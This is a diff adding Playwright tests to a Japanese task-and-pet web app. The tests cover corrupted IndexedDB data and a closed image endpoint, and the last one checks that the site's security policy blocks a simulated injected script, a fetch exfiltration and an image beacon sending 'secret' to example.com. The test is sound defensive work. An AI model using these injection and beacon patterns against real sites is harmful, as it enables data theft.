@@ -126,3 +126,74 @@ test("IndexedDB が使えない環境では、説明つきのエラー画面を�
   await expect(page.locator("main").getByRole("alert")).toContainText("データを開けませんでした");
   await expect(page.getByRole("button", { name: "もう一度ためす" })).toBeVisible();
 });
+
+test("保存データ（IndexedDB）を壊されても、全画面が表示できる", async ({ page }) => {
+  const errors: string[] = [];
+  page.on("pageerror", (e) => errors.push(String(e)));
+  await start(page);
+  await addTask(page, "ふつうのタスク");
+  await page.evaluate(
+    () =>
+      new Promise<void>((resolve, reject) => {
+        const req = indexedDB.open("gohobi-neko");
+        req.onsuccess = () => {
+          const db = req.result;
+          const tx = db.transaction(["state", "tasks", "events"], "readwrite");
+          tx.objectStore("state").put({ id: "main", onboarded: true, cat: { name: "たま", xp: "abc", fullness: null, bornAt: "x" }, inventory: null });
+          tx.objectStore("tasks").put({ id: "bad1", title: { a: 1 }, difficulty: "ultra", status: "weird", completedAt: "y" });
+          tx.objectStore("tasks").put({ id: "bad2" });
+          tx.objectStore("events").add({ type: "???", at: "never", stage: "dragon" });
+          tx.objectStore("events").add({ type: "evolve", at: 1, level: "x" });
+          tx.oncomplete = () => {
+            db.close();
+            resolve();
+          };
+          tx.onerror = () => reject(tx.error);
+        };
+      }),
+  );
+  for (const path of ["/", "/tasks", "/records", "/settings"]) {
+    await page.goto(path);
+    await expect(page.locator("main .card").first()).toBeVisible();
+  }
+  await page.goto("/tasks");
+  await expect(page.getByTestId("task-item")).toHaveCount(1); // 読めないタスクは一覧に出さない
+  await page.goto("/");
+  await expect(page.getByTestId("cat-name")).toHaveText("たま");
+  await expect(page.getByTestId("cat-level")).toHaveText("1");
+  expect(errors, errors.join("\n")).toEqual([]);
+});
+
+test("使っていない画像変換の入口が閉じている", async ({ request }) => {
+  const res = await request.get("/_next/image?url=%2Fcat%2Fnormal.webp&w=64&q=75");
+  expect(res.status()).toBe(404);
+});
+
+test("注入に成功したと仮定しても、外部への読み込み・送信はできない", async ({ page }) => {
+  await start(page);
+  const r = await page.evaluate(async () => {
+    const script = await new Promise<string>((ok) => {
+      const s = document.createElement("script");
+      s.src = "https://example.com/x.js";
+      s.onload = () => ok("LOADED");
+      s.onerror = () => ok("blocked");
+      document.head.appendChild(s);
+    });
+    const send = await fetch("https://example.com/?d=1").then(() => "SENT").catch(() => "blocked");
+    const img = await new Promise<string>((ok) => {
+      const i = new Image();
+      i.onload = () => ok("LOADED");
+      i.onerror = () => ok("blocked");
+      i.src = "https://example.com/p.png?d=secret";
+    });
+    let ev = "blocked";
+    try {
+      (0, eval)("1");
+      ev = "RAN";
+    } catch {
+      /* CSP で禁止 */
+    }
+    return { script, send, img, ev };
+  });
+  expect(r).toEqual({ script: "blocked", send: "blocked", img: "blocked", ev: "blocked" });
+});
